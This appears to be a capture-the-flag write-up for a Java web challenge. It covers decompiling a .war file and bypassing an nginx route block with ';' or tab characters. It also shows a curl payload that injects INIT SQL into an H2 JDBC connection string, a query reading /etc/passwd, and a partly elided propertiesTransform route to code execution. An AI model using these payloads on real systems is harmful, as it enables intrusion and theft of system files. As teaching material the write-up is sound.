# PortfolioS

### Resources

#### 1. H2 database

([https://www.h2database.com/h2.pdf](https://www.h2database.com/h2.pdf))

{% embed url="https://www.h2database.com/html/features.html" %}

{% embed url="https://www.h2database.com/html/grammar.html" %}

{% embed url="https://www.baeldung.com/spring-boot-h2-database" %}

{% embed url="https://www.baeldung.com/java-h2-executing-sql-scripts" %}

#### 2. Exploitation

{% embed url="https://www.code-intelligence.com/blog/cve-jdbc-mysql-driver-rce-unauthorized-read-write-access" %}

{% embed url="https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#mysql" %}

{% embed url="https://dev.mysql.com/doc/refman/8.4/en/select-into.html" %}

{% embed url="https://dev.mysql.com/doc/refman/8.4/en/string-functions.html#function_load-file" %}

{% embed url="https://github.com/Avento/CVE-2023-21971_Analysis" %}
CVE-2023-21971 Explanation
{% endembed %}

{% embed url="https://dev.mysql.com/doc/connector-j/en/connector-j-connp-props-connection.html#cj-conn-prop_propertiesTransform" %}
"propertiesTransform" description
{% endembed %}



#### 3. Others

{% embed url="https://bksec.vn/blog/writeup-cscv-2025" %}

{% embed url="https://github.com/awslabs/aws-mysql-jdbc/security/advisories/GHSA-vj9v-mpjv-qf74" %}

{% embed url="https://stackoverflow.com/questions/3833578/linux-command-for-extracting-war-file" %}



> Relevant Google dork terms to search:

```
DriverManager.getConnection RCE
h2 database getconnection "propertiesTransform"
```

### Analysis of the configuration files

1. `nginx.conf`

```nginx
events {}

http {
    server {
        listen 80;

        location = /internal/testConnection {
            return 403;
        }

        location / {
            proxy_pass http://app:8989;

            proxy_set_header Host $host:8989;
            proxy_set_header X-Real-IP $remote_addr;
        }
    }
}
```

* We can see that the `/internal/testConnection` route is filtered, and returns a 403 response.

### 1. Extraction and analysis of source code

...

#### 1.1 Extract files from `.war`

```sh
$ sudo apt install default-jdk
$ jar xvf /path/to/portfolio.war
```

#### 1.2 Decompile selected .class files

*   There are a few files of interest:

    1\) `WEB-INF/classes/com/ctf/portfolio/controller/AuthController.class`

    2\) `WEB-INF/classes/com/ctf/portfolio/controller/InternalController.class`

    3\) ...



* We can use the **CFR Java Decompiler**
  * Install the `cfr-xxx.jar` file from the [Github ](https://github.com/leibnitz27/cfr)repository release page (filename depends on the current version):

```sh
$ java -jar cfr-xxx.jar <to-decompile>.class
```

* Alternatively, we can use directly open any `.class` file in an editor such as Visual Studio Code, which will automatically decompile it.

#### 1.3 Analysis of the source cod`e`

a. From the import statements defined in the `.class` files, we can identify that the Spring framework is used

b. From the `WEB-INF/classes/com/ctf/portfolio/controller/InternalController.class` file, we can identify that H2 database is in use:

<figure><img src="../../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>



### 2. Exploring the H2 database configuration

From the `internalController.class`  file we have analyzed previously, we see the definition for the **POST** `/internal/testConnection` route:

<figure><img src="../../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

Notice that the `fullUrl` variable is crafted from an input that we can control. This variable is used as an  argument to the `DriverManager.getConnection()` function.&#x20;

With this, we have an interesting attack vector. However, remember that the `/internal/testConnection` route returns a 403 error? Read on to understand how we can bypass this restriction.

#### 2.1 nginx + spring boot

{% embed url="https://blog.1nf1n1ty.team/hacktricks/pentesting-web/proxy-waf-protections-bypass#spring-boot" %}

From enumeration, we can identify that the Nginx is running on version 1.20.2 (_**Server**_ field from the HTTP response headers). Fortunately for us, that particular version of Nginx has a character bypass vulnerability which results from the Nginx WAF not removing a certain few characters (during normalization), but will be removed by the Spring boot server. The characters are:

```
\x09, ;
```

Hence, if we send a request to the `/internal/testConnection\0x09` or `/internal/testConnection;` routes, it will successfully bypass the Nginx filters. This will allow us to send a request to the `/internal/testConnection` route as if the Nginx filter is not present.

#### 2.2 Exploiting the unsanitized input to the `.getConnection()` function

#### 2.2.1 SQL statements

> Refer to the links above for more information regarding H2 database, and how to execute SQL commands, and escalate to RCE from there

{% code overflow="wrap" %}
```sh
$ curl -X POST "http://<target>/internal/testConnection;" -H "Cookie: JSESSIONID=xxxx" -H "content-type: application/json" -d "username=sa&password=;DB_CLOSE_DELAY=-1;INIT=<SQL>;"
```
{% endcode %}

* `<SQL>` can be replaced with any SQL commands:

{% code overflow="wrap" %}
```sql
SELECT load_file("/etc/passwd") from information_schema
...

```
{% endcode %}

* `DB_CLOSE_DELAY = -1`&#x20;

> This option ensures the database remains open as long as the Java Virtual Machine (JVM) is running. It prevents it from closing automatically when the last connection is closed. By default, the database closes when the last connection is terminated. The default value is zero. However, it’s essential to shut down the database with a shutdown command to avoid potential memory leaks.

#### 2.2.2 `propertiesTransform`

...

We can insert the `propertiesTransform` field into the payload:

Eg.&#x20;

{% code overflow="wrap" %}
```
username=sa;password=;DB_CLOSE_DELAY=-1;propertiesTransform=com.example.MyArbitraryClass"
```
{% endcode %}

In this case, we can create the `com.example.MyArbitraryClass` class, to perform RCE. We can use the payload to craft an SQL command (`INIT` field):

```sql
SELECT ... OUTFILE /path/to/MyArbitaryClass.java
```

